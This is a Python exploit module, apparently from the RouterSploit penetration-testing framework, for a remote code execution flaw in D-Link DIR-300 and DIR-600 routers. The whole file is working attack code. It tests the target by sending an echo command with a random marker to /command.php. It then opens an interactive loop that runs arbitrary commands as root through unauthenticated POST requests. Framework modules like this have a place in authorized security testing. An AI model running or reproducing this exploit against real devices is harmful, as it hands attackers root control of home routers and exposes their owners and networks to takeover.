from routersploit import (
    exploits,
    print_error,
    print_success,
    print_status,
    print_info,
    random_text,
    http_request,
    mute,
    validators,
)


class Exploit(exploits.Exploit):
    """
    Exploit implementation for D-Link DIR-300, DIR-600 Remote Code Execution vulnerability.
    If the target is vulnerable, command loop is invoked that allows executing commands with root privileges.
    """
    __info__ = {
        'name': 'D-LINK DIR-300 & DIR-600 RCE',
        'description': 'Module exploits D-Link DIR-300, DIR-600 Remote Code Execution vulnerability which allows executing command on operating system level with root privileges.',
        'authors': [
            'Michael Messner <devnull[at]s3cur1ty.de>',  # vulnerability discovery
            'Marcin Bury <marcin.bury[at]reverse-shell.com>',  # routersploit module
        ],
        'references': [
            'http://www.dlink.com/uk/en/home-solutions/connect/routers/dir-600-wireless-n-150-home-router',
            'http://www.s3cur1ty.de/home-network-horror-days',
            'http://www.s3cur1ty.de/m1adv2013-003',
        ],
        'devices': [
            'D-Link DIR 300',
            'D-Link DIR 600',
        ]
    }

    target = exploits.Option('', 'Target address e.g. http://192.168.1.1', validators=validators.url)
    port = exploits.Option(80, 'Target Port')

    def run(self):
        if self.check():
            print_success("Target is vulnerable")
            print_status("Invoking command loop...")
            self.command_loop()
        else:
            print_error("Target is not vulnerable")

    def command_loop(self):
        while 1:
            cmd = raw_input("cmd > ")

            if cmd in ['exit', 'quit']:
                return

            print_info(self.execute(cmd))

    def execute(self, cmd):
        url = "{}:{}/command.php".format(self.target, self.port)
        headers = {u'Content-Type': u'application/x-www-form-urlencoded'}
        data = "cmd={}".format(cmd)

        response = http_request(method="POST", url=url, headers=headers, data=data)
        if response is None:
            return ""

        return response.text.strip()

    @mute
    def check(self):
        mark = random_text(32)
        cmd = "echo {}".format(mark)

        response = self.execute(cmd)

        if mark in response:
            return True  # target is vulnerable

        return False  # target is not vulnerable
